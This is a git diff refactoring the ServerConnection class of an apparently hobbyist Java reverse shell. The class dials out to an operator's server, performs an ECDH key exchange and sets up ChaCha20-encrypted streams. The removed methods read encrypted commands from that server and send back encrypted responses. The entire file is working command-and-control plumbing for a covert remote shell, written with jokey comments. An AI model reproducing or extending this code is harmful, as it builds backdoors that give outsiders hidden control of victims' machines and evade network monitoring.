@@ -1,36 +1,27 @@
 package obs1d1anc1ph3r.reverseshell;
 
-import obs1d1anc1ph3r.reverseshell.encryption.ECDHKeyExchange;
-import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;
-
 import java.io.*;
 import java.net.*;
-import java.security.SecureRandom;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import obs1d1anc1ph3r.reverseshell.encryption.KeyExchangeHandler;
+import obs1d1anc1ph3r.reverseshell.utils.StreamHandler;
 
 public class ServerConnection {
 
 	private final String serverIp;
 	private final int serverPort;
 	private Socket socket;
-	private DataInputStream dataIn;
-	private DataOutputStream dataOut;
-	private byte[] encryptionKey;
+	private StreamHandler streamHandler;
 	private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
+	private byte[] encryptionKey;
 
-	private final byte[] privateKey;
-	private final byte[] publicKey;
-
-	/*This class does way too much fucking stuff
-	ToDo - refactor this shit */
+	//Refactoring it now
+	//This is sooooo much better, probably still needs more work at some point tho
 	public ServerConnection(String serverIp, int serverPort) {
 		this.serverIp = serverIp;
 		this.serverPort = serverPort;
 
-		//Get the keys for the handshake
-		this.privateKey = ECDHKeyExchange.generatePrivateKey();
-		this.publicKey = ECDHKeyExchange.generatePublicKey(privateKey);
 	}
 
 	public synchronized void connect() throws IOException {
@@ -39,20 +30,16 @@ public class ServerConnection {
 			socket = new Socket();
 			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000); //I think this is a timeout thing, I forgot tbh
 			System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
-			dataIn = new DataInputStream(socket.getInputStream());
-			dataOut = new DataOutputStream(socket.getOutputStream());
-			
-			//Send the public key
-			sendPublicKey();
-			byte[] serverPublicKey = receivePublicKey();
 
-			if (serverPublicKey == null || serverPublicKey.length == 0) {
-				throw new IOException("Invalid or empty public key received.");
-			}
+			streamHandler = new StreamHandler(socket);
 
-			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(privateKey, serverPublicKey); //Do the handshake
+			KeyExchangeHandler keyExchange = new KeyExchangeHandler(streamHandler);
+			keyExchange.sendPublicKey();
 
+			encryptionKey = keyExchange.performKeyExchange();
+			setStreamHandlerEncryptionKey();
 			System.out.println("[-*] Encryption key established.");
+
 		} catch (UnknownHostException e) {
 			logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
 			cleanup();
@@ -64,83 +51,30 @@ public class ServerConnection {
 		}
 	}
 
-	//Prove yourself worthy
-	private void sendPublicKey() throws IOException {
-		dataOut.writeInt(publicKey.length);
-		dataOut.write(publicKey);
-		dataOut.flush();
+	public StreamHandler getStreamHandler() {
+		return streamHandler;
 	}
 
-	//Okay...but are you worthy?
-	private byte[] receivePublicKey() throws IOException {
-		int length = dataIn.readInt();
-		if (length <= 0 || length > 256) {
-			throw new IOException("Invalid public key length received.");
-		}
-		byte[] publicKeyServer = new byte[length];
-		dataIn.readFully(publicKeyServer);
-		return publicKeyServer;
+	public void setStreamHandlerEncryptionKey() {
+		streamHandler.setEncryptionKey(encryptionKey);
 	}
-	
-	//I'm illiterate, so I make computers read for me
-	public String readCommand() throws IOException {
-		int length = dataIn.readInt();
-		if (length <= 12) {
-			throw new IOException("Invalid encrypted command length.");
-		}
 
-		byte[] nonce = new byte[12];
-		byte[] encryptedCommand = new byte[length - 12];
-
-		dataIn.readFully(nonce);
-		dataIn.readFully(encryptedCommand);
-
-		try {
-			byte[] decryptedCommand = ChaCha20.decrypt(encryptionKey, nonce, encryptedCommand);
-			return ChaCha20.bytesToString(decryptedCommand);
-		} catch (Exception e) {
-			throw new IOException("Failed to decrypt command", e);
-		}
-	}
-	
-	//I have social anxiety, so I make computers respond for me
-	public void sendEncryptedResponse(String response) throws IOException, Exception {
-		byte[] nonce = new byte[12];
-		new SecureRandom().nextBytes(nonce);
-
-		byte[] encryptedResponse = ChaCha20.encrypt(encryptionKey, nonce, ChaCha20.stringToBytes(response));
-
-		dataOut.writeInt(nonce.length + encryptedResponse.length);
-		dataOut.write(nonce);
-		dataOut.write(encryptedResponse);
-		dataOut.flush();
-	}
-	
-	//Pass it on
-	public DataOutputStream getDataOut() {
-		return dataOut;
-	}
-	
-	//Pass it on
-	public byte[] getSessionKey() {
-		return encryptionKey;
+	public Socket getSocket() {
+		return socket;
 	}
 
 	//I think this works, if it doesn't, then if it stops with errors, it's still stopped, so win win, I guess
 	public synchronized void cleanup() {
 		try {
-			if (dataIn != null) {
-				dataIn.close();
-			}
-			if (dataOut != null) {
-				dataOut.close();
+			if (streamHandler != null) {
+				streamHandler.close();
 			}
 			if (socket != null) {
 				socket.close();
 			}
 			System.out.println("[*] Resources cleaned up successfully.");
 		} catch (IOException e) {
-			logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
+			logger.log(Level.SEVERE, "Error closing resources: {0}", e.getMessage());
 		}
 	}
 }
